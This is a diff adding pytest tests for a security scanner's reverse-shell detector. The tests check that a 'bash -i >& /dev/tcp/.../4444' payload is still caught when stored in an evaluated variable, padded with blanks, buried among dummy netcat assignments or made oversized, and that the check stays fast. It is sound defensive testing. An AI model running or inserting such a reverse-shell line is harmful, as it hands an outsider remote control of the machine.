@@ -19,7 +19,7 @@ import pytest
 
 from clawseccheck.catalog import FAIL
 from clawseccheck.checks import vet_skill
-from clawseccheck.skillast import analyze_shell
+from clawseccheck.skillast import _sh_mask_comments, _sh_reverse_shell_lines, analyze_shell
 
 _RULE = "SHELL_REVERSE_SHELL"
 _PAY = "bash -i >& /dev/tcp/203.0.113.77/4444 0>&1"
@@ -102,3 +102,70 @@ def test_vet_skill_fails_the_bug_repro_and_the_inline_control_alike(tmp_path):
 def test_vet_skill_does_not_fail_a_variable_that_is_only_echoed(tmp_path):
     r = vet_skill(_mk_skill(tmp_path / "ok", "#!/bin/bash\n" + _GOOD["echo_only"]))
     assert r.status != FAIL, r.detail
+
+
+# --------------------------------------------------------------------------- #
+# review hardening: inlining only ADDS a layer, caps fail closed, work bounded #
+# --------------------------------------------------------------------------- #
+def test_inlining_never_removes_a_detection_the_raw_line_already_has():
+    # a stored value with quotes / backslashes / a comment char sits on the same line as an
+    # inline payload: the raw line convicts today, and must keep convicting with the ref there
+    for val in ("it's #1", 'say "hi" \\ there', "echo $HOME `date` ; x", "nc -z host 22"):
+        q = "'" if "'" not in val else '"'
+        body = val.replace('"', '\\"') if q == '"' else val
+        src = f"C={q}{body}{q}\neval \"$C\"; {_PAY}\n"
+        assert _hits(f"eval x; {_PAY}\n") == [1]
+        assert _hits(src) == [2], val
+    both = f'C="{_PAY}"\neval "$C"; {_PAY}\n'
+    assert _hits(both) == [2]
+
+
+def test_a_payload_padded_with_blanks_is_still_convicted():
+    pad = " " * 10_000
+    assert _hits(f'C="{_PAY}{pad}"\neval "$C"\n') == [2]
+    assert _hits(f'C="{pad}{_PAY}"\neval "$C"\n') == [2]
+    assert _hits(f'C="bash -i{pad}>& /dev/tcp/203.0.113.77/4444 0>&1"\neval "$C"\n') == [2]
+
+
+def test_many_dummy_assignments_before_the_real_one_do_not_evict_it():
+    dummies = "".join(f'D{i}="nc -z host {i}"\n' for i in range(500))
+    assert _hits(dummies + f'C="{_PAY}"\neval "$C"\n') == [502]
+    assert _hits(f'C="{_PAY}"\n' + dummies + 'eval "$C"\n') == [502]
+
+
+def test_a_value_longer_than_the_inlining_budget_is_still_judged():
+    big = _PAY + " ; " + "x" * 40_000
+    assert _hits(f'C="{big}"\neval "$C"\n') == [2]
+    assert _hits(f'C="{big}"\nsh -c "$C"\n') == [2]
+    # no run site -> still silent
+    assert _hits(f'C="{big}"\necho "$C"\n') == []
+
+
+def _timed(src: str) -> tuple:
+    """`(hit lines, CPU seconds)` of the reverse-shell pass alone (other, older passes of
+    `analyze_shell` have their own cost on a 60 KB single line, with or without a variable)."""
+    import time
+
+    masked = _sh_mask_comments(src)
+    t0 = time.process_time()
+    hits = [ln for ln, _shape in _sh_reverse_shell_lines(masked)]
+    return hits, time.process_time() - t0
+
+
+def test_thousands_of_references_on_one_line_stay_fast():
+    ref = 'eval "$C"; ' * 5000
+    hits, cpu = _timed(f'C="{_PAY}"\n{ref}\n')
+    assert hits == [2] and cpu < 1.0, cpu
+    big = _PAY + " ; " + "x" * 12_000
+    hits, cpu = _timed(f'C="{big}"\n{ref}\n')
+    assert hits == [2] and cpu < 1.0, cpu
+
+
+def test_many_lines_each_running_a_large_stored_value_stay_fast():
+    big = "nc -z h 1 " + "x" * 15_000 + " /dev/null"
+    src = f'C="{big}"\n' + 'eval "$C"\n' * 20_000
+    hits, cpu = _timed(src)
+    assert hits == [] and cpu < 5.0, cpu
+    src2 = f'C="{_PAY} ; {"x" * 15_000}"\n' + 'eval "$C"\n' * 20_000
+    hits, cpu = _timed(src2)
+    assert len(hits) == 20_000 and cpu < 5.0, cpu
